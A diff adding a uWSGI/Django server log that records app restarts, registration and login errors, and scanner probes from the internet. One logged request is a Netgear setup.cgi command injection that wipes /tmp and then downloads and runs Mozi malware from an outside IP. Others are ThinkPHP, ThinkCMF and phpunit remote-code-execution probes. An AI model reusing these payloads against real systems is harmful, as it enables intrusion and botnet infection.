@@ -1,0 +1,383 @@
+gateway "uWSGI http 1" has been buried (pid: 596430)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 596427)...
+Gracefully killing worker 2 (pid: 596428)...
+Gracefully killing worker 3 (pid: 596429)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/Gtylcara/app/garbage
+closing all non-uwsgi socket fds > 2 (max_fd = 100002)...
+found fd 6 mapped to socket 0 (127.0.0.1:36643)
+running /root/.local/share/virtualenvs/app-w8XECbK1/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Apr 30 13:12:55 2021] ***
+compiled with version: 8.3.1 20191121 (Red Hat 8.3.1-5) on 24 February 2021 10:48:28
+os: Linux-4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019
+nodename: VM-0-3-centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/Gtylcara/app/garbage
+detected binary path: /root/.local/share/virtualenvs/app-w8XECbK1/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/Gtylcara/app/garbage
+your processes number limit is 7212
+your memory page size is 4096 bytes
+detected max file descriptor number: 100002
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8000 fd 8
+uwsgi socket 0 bound to TCP address 127.0.0.1:46457 (port auto-assigned) fd 7
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.3 (default, Aug 31 2020, 16:03:14)  [GCC 8.3.1 20191121 (Red Hat 8.3.1-5)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x2195ab0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 537436 bytes (524 KB) for 3 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x2195ab0 pid: 16980 (default app)
+mountpoint  already configured. skip.
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16980)
+spawned uWSGI worker 1 (pid: 596738, cores: 1)
+spawned uWSGI worker 2 (pid: 596739, cores: 1)
+spawned uWSGI worker 3 (pid: 596740, cores: 1)
+*** Stats server enabled on uwsgi.status fd: 16 ***
+spawned uWSGI http 1 (pid: 596741)
+[pid: 596738|app: 0|req: 1/1] 127.0.0.1 () {36 vars in 723 bytes} [Fri Apr 30 13:12:57 2021] GET /api/register/checkSMS?mobile=11111111111&verifycode=1&hmac=9760790f9daf571d327fb768186173a1 => generated 22 bytes in 9 msecs (HTTP/1.0 200) 5 headers in 165 bytes (1 switches on core 0)
+None
+Internal Server Error: /api/register
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.OperationalError: no such table: WaterWell_userdb
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./garbage/views.py", line 89, in register
+    conn.execute(sql)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.OperationalError: no such table: WaterWell_userdb
+[pid: 596738|app: 0|req: 2/2] 127.0.0.1 () {36 vars in 723 bytes} [Fri Apr 30 13:12:58 2021] GET /api/register?mobile=11111111111&pwd=111111&username=1&hmac=156548a0349e80f779ba13a5ef77aae9 => generated 13830 bytes in 33 msecs (HTTP/1.0 500) 6 headers in 202 bytes (1 switches on core 0)
+gateway "uWSGI http 1" has been buried (pid: 596741)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 596738)...
+Gracefully killing worker 2 (pid: 596739)...
+Gracefully killing worker 3 (pid: 596740)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/Gtylcara/app/garbage
+closing all non-uwsgi socket fds > 2 (max_fd = 100002)...
+found fd 7 mapped to socket 0 (127.0.0.1:46457)
+running /root/.local/share/virtualenvs/app-w8XECbK1/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Apr 30 13:13:20 2021] ***
+compiled with version: 8.3.1 20191121 (Red Hat 8.3.1-5) on 24 February 2021 10:48:28
+os: Linux-4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019
+nodename: VM-0-3-centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/Gtylcara/app/garbage
+detected binary path: /root/.local/share/virtualenvs/app-w8XECbK1/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/Gtylcara/app/garbage
+your processes number limit is 7212
+your memory page size is 4096 bytes
+detected max file descriptor number: 100002
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8000 fd 8
+uwsgi socket 0 bound to TCP address 127.0.0.1:36117 (port auto-assigned) fd 6
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.3 (default, Aug 31 2020, 16:03:14)  [GCC 8.3.1 20191121 (Red Hat 8.3.1-5)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x7ceab0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 537436 bytes (524 KB) for 3 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x7ceab0 pid: 16980 (default app)
+mountpoint  already configured. skip.
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16980)
+spawned uWSGI worker 1 (pid: 596795, cores: 1)
+spawned uWSGI worker 2 (pid: 596796, cores: 1)
+spawned uWSGI worker 3 (pid: 596797, cores: 1)
+*** Stats server enabled on uwsgi.status fd: 16 ***
+spawned uWSGI http 1 (pid: 596798)
+[pid: 596796|app: 0|req: 1/1] 127.0.0.1 () {36 vars in 722 bytes} [Fri Apr 30 13:13:22 2021] GET /api/register/checkSMS?mobile=11111111111&verifycode=1&hmac=9760790f9daf571d327fb768186173a1 => generated 22 bytes in 9 msecs (HTTP/1.0 200) 5 headers in 165 bytes (1 switches on core 0)
+None
+Internal Server Error: /api/register
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.IntegrityError: NOT NULL constraint failed: garbage_userdb.face
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./garbage/views.py", line 89, in register
+    conn.execute(sql)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.IntegrityError: NOT NULL constraint failed: garbage_userdb.face
+[pid: 596796|app: 0|req: 2/2] 127.0.0.1 () {36 vars in 722 bytes} [Fri Apr 30 13:13:24 2021] GET /api/register?mobile=11111111111&pwd=111111&username=1&hmac=156548a0349e80f779ba13a5ef77aae9 => generated 13873 bytes in 25 msecs (HTTP/1.0 500) 6 headers in 202 bytes (1 switches on core 0)
+gateway "uWSGI http 1" has been buried (pid: 596798)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 596795)...
+Gracefully killing worker 2 (pid: 596796)...
+Gracefully killing worker 3 (pid: 596797)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/Gtylcara/app/garbage
+closing all non-uwsgi socket fds > 2 (max_fd = 100002)...
+found fd 6 mapped to socket 0 (127.0.0.1:36117)
+running /root/.local/share/virtualenvs/app-w8XECbK1/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Fri Apr 30 13:14:13 2021] ***
+compiled with version: 8.3.1 20191121 (Red Hat 8.3.1-5) on 24 February 2021 10:48:28
+os: Linux-4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019
+nodename: VM-0-3-centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/Gtylcara/app/garbage
+detected binary path: /root/.local/share/virtualenvs/app-w8XECbK1/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/Gtylcara/app/garbage
+your processes number limit is 7212
+your memory page size is 4096 bytes
+detected max file descriptor number: 100002
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8000 fd 8
+uwsgi socket 0 bound to TCP address 127.0.0.1:38347 (port auto-assigned) fd 7
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.3 (default, Aug 31 2020, 16:03:14)  [GCC 8.3.1 20191121 (Red Hat 8.3.1-5)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1547ab0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 537436 bytes (524 KB) for 3 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1547ab0 pid: 16980 (default app)
+mountpoint  already configured. skip.
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 16980)
+spawned uWSGI worker 1 (pid: 596901, cores: 1)
+spawned uWSGI worker 2 (pid: 596902, cores: 1)
+spawned uWSGI worker 3 (pid: 596903, cores: 1)
+*** Stats server enabled on uwsgi.status fd: 16 ***
+spawned uWSGI http 1 (pid: 596904)
+[pid: 596903|app: 0|req: 1/1] 127.0.0.1 () {36 vars in 722 bytes} [Fri Apr 30 13:14:16 2021] GET /api/register/checkSMS?mobile=11111111111&verifycode=1&hmac=9760790f9daf571d327fb768186173a1 => generated 22 bytes in 9 msecs (HTTP/1.0 200) 5 headers in 165 bytes (1 switches on core 0)
+None
+[pid: 596903|app: 0|req: 2/2] 127.0.0.1 () {36 vars in 723 bytes} [Fri Apr 30 13:14:17 2021] GET /api/register?mobile=11111111111&pwd=111111&username=1&hmac=156548a0349e80f779ba13a5ef77aae9 => generated 22 bytes in 56 msecs (HTTP/1.0 200) 5 headers in 165 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 3/3] 127.0.0.1 () {32 vars in 367 bytes} [Fri Apr 30 13:16:29 2021] GET / => generated 2850 bytes in 7 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Internal Server Error: /api/login
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/utils/datastructures.py", line 76, in __getitem__
+    list_ = super().__getitem__(key)
+KeyError: 'username'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./garbage/views.py", line 18, in login
+    username = request.GET["username"]
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/utils/datastructures.py", line 78, in __getitem__
+    raise MultiValueDictKeyError(key)
+django.utils.datastructures.MultiValueDictKeyError: 'username'
+[pid: 596903|app: 0|req: 4/4] 127.0.0.1 () {36 vars in 14125 bytes} [Fri Apr 30 13:43:08 2021] GET /api/login?username%3Dadmin%26pwd%3Dpassword%26hmac%3D5fbeee0f72223855d6db82c217fe93db => generated 123733 bytes in 97 msecs (HTTP/1.0 500) 6 headers in 187 bytes (1 switches on core 0)
+Internal Server Error: /api/login
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/utils/datastructures.py", line 76, in __getitem__
+    list_ = super().__getitem__(key)
+KeyError: 'username'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./garbage/views.py", line 18, in login
+    username = request.GET["username"]
+  File "/root/.local/share/virtualenvs/app-w8XECbK1/lib/python3.8/site-packages/django/utils/datastructures.py", line 78, in __getitem__
+    raise MultiValueDictKeyError(key)
+django.utils.datastructures.MultiValueDictKeyError: 'username'
+[pid: 596903|app: 0|req: 5/5] 127.0.0.1 () {36 vars in 674 bytes} [Fri Apr 30 13:43:09 2021] GET /api/login?username%3Dadmin%26pwd%3Dpassword%26hmac%3D5fbeee0f72223855d6db82c217fe93db => generated 61848 bytes in 58 msecs (HTTP/1.0 500) 6 headers in 186 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 6/6] 127.0.0.1 () {32 vars in 406 bytes} [Fri Apr 30 13:53:40 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 596903|app: 0|req: 7/7] 127.0.0.1 () {32 vars in 458 bytes} [Fri Apr 30 13:58:52 2021] GET /.env => generated 2880 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /
+[pid: 596903|app: 0|req: 8/8] 127.0.0.1 () {36 vars in 520 bytes} [Fri Apr 30 13:58:56 2021] POST / => generated 2870 bytes in 21 msecs (HTTP/1.0 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 596903|app: 0|req: 9/9] 127.0.0.1 () {36 vars in 691 bytes} [Fri Apr 30 14:20:46 2021] GET /api/login?username=admin&pwd=password&hmac=5fbeee0f72223855d6db82c217fe93db => generated 75 bytes in 1 msecs (HTTP/1.0 200) 5 headers in 165 bytes (1 switches on core 0)
+[pid: 596903|app: 0|req: 10/10] 127.0.0.1 () {36 vars in 679 bytes} [Fri Apr 30 14:21:15 2021] GET /api/login?username=1&pwd=111111&hmac=017f8bdc42a147a13fa78be041edd244 => generated 71 bytes in 1 msecs (HTTP/1.0 200) 5 headers in 165 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 11/11] 127.0.0.1 () {30 vars in 418 bytes} [Fri Apr 30 14:25:30 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 12/12] 127.0.0.1 () {32 vars in 450 bytes} [Fri Apr 30 15:55:07 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 13/13] 127.0.0.1 () {30 vars in 419 bytes} [Fri Apr 30 16:12:24 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 14/14] 127.0.0.1 () {30 vars in 419 bytes} [Fri Apr 30 17:46:37 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /config/getuser
+[pid: 596903|app: 0|req: 15/15] 127.0.0.1 () {36 vars in 608 bytes} [Fri Apr 30 17:49:09 2021] GET /config/getuser?index=0 => generated 2918 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 16/16] 127.0.0.1 () {26 vars in 271 bytes} [Fri Apr 30 17:53:37 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /setup.cgi
+[pid: 596903|app: 0|req: 17/17] 127.0.0.1 () {26 vars in 590 bytes} [Fri Apr 30 17:57:08 2021] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://220.113.185.164:45671/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 3062 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 18/18] 127.0.0.1 () {32 vars in 357 bytes} [Fri Apr 30 18:13:10 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /manager/html
+[pid: 596903|app: 0|req: 19/19] 127.0.0.1 () {32 vars in 381 bytes} [Fri Apr 30 19:19:37 2021] GET /manager/html => generated 2904 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /wp-login.php
+[pid: 596903|app: 0|req: 20/20] 127.0.0.1 () {36 vars in 19217 bytes} [Fri Apr 30 20:04:47 2021] GET /wp-login.php => generated 2904 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /wp-login.php
+[pid: 596903|app: 0|req: 21/21] 127.0.0.1 () {36 vars in 527 bytes} [Fri Apr 30 20:04:47 2021] GET /wp-login.php => generated 2904 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 22/22] 127.0.0.1 () {30 vars in 425 bytes} [Fri Apr 30 20:08:21 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 23/23] 127.0.0.1 () {30 vars in 419 bytes} [Fri Apr 30 20:14:46 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 24/24] 127.0.0.1 () {30 vars in 336 bytes} [Fri Apr 30 21:06:33 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 25/25] 127.0.0.1 () {28 vars in 333 bytes} [Fri Apr 30 21:29:47 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 26/26] 127.0.0.1 () {30 vars in 419 bytes} [Fri Apr 30 21:57:18 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 27/27] 127.0.0.1 () {28 vars in 368 bytes} [Fri Apr 30 22:10:33 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /level/15/exec/-/sh/run/CR
+[pid: 596903|app: 0|req: 28/28] 127.0.0.1 () {28 vars in 356 bytes} [Fri Apr 30 22:31:30 2021] GET /level/15/exec/-/sh/run/CR => generated 2943 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 29/29] 127.0.0.1 () {30 vars in 419 bytes} [Fri Apr 30 23:00:05 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /api/jsonws/invoke
+[pid: 596903|app: 0|req: 30/30] 127.0.0.1 () {34 vars in 519 bytes} [Fri Apr 30 23:26:08 2021] POST /api/jsonws/invoke => generated 2870 bytes in 1 msecs (HTTP/1.0 403) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 596903|app: 0|req: 31/31] 127.0.0.1 () {32 vars in 553 bytes} [Fri Apr 30 23:26:08 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 3018 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 596903|app: 0|req: 32/32] 127.0.0.1 () {34 vars in 603 bytes} [Fri Apr 30 23:26:08 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2870 bytes in 1 msecs (HTTP/1.0 403) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /index.php
+[pid: 596903|app: 0|req: 33/33] 127.0.0.1 () {30 vars in 656 bytes} [Fri Apr 30 23:26:08 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 3014 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 34/34] 127.0.0.1 () {32 vars in 568 bytes} [Fri Apr 30 23:26:09 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 2914 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 35/35] 127.0.0.1 () {30 vars in 492 bytes} [Fri Apr 30 23:26:09 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 2880 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[pid: 596903|app: 0|req: 36/36] 127.0.0.1 () {30 vars in 523 bytes} [Fri Apr 30 23:26:09 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 3003 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /solr/admin/info/system
+[pid: 596903|app: 0|req: 37/37] 127.0.0.1 () {30 vars in 492 bytes} [Fri Apr 30 23:26:09 2021] GET /solr/admin/info/system?wt=json => generated 2942 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /console/
+[pid: 596903|app: 0|req: 38/38] 127.0.0.1 () {30 vars in 449 bytes} [Fri Apr 30 23:26:10 2021] GET /console/ => generated 2892 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /_ignition/execute-solution
+[pid: 596903|app: 0|req: 39/39] 127.0.0.1 () {32 vars in 517 bytes} [Fri Apr 30 23:26:10 2021] GET /_ignition/execute-solution => generated 2946 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /Autodiscover/Autodiscover.xml
+[pid: 596903|app: 0|req: 40/40] 127.0.0.1 () {34 vars in 544 bytes} [Fri Apr 30 23:26:11 2021] POST /Autodiscover/Autodiscover.xml => generated 2870 bytes in 1 msecs (HTTP/1.0 403) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 41/41] 127.0.0.1 () {30 vars in 319 bytes} [Fri Apr 30 23:57:06 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /
+[pid: 596903|app: 0|req: 42/42] 127.0.0.1 () {30 vars in 332 bytes} [Sat May  1 00:20:30 2021] GET / => generated 2850 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /TP/public/index.php
+[pid: 596903|app: 0|req: 43/43] 127.0.0.1 () {30 vars in 440 bytes} [Sat May  1 01:33:27 2021] GET /TP/public/index.php => generated 2925 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /TP/index.php
+[pid: 596903|app: 0|req: 44/44] 127.0.0.1 () {30 vars in 426 bytes} [Sat May  1 01:33:27 2021] GET /TP/index.php => generated 2904 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /thinkphp/html/public/index.php
+[pid: 596903|app: 0|req: 45/45] 127.0.0.1 () {30 vars in 462 bytes} [Sat May  1 01:33:27 2021] GET /thinkphp/html/public/index.php => generated 2958 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /html/public/index.php
+[pid: 596903|app: 0|req: 46/46] 127.0.0.1 () {30 vars in 444 bytes} [Sat May  1 01:33:27 2021] GET /html/public/index.php => generated 2931 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /public/index.php
+[pid: 596903|app: 0|req: 47/47] 127.0.0.1 () {30 vars in 434 bytes} [Sat May  1 01:33:27 2021] GET /public/index.php => generated 2916 bytes in 3 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /TP/html/public/index.php
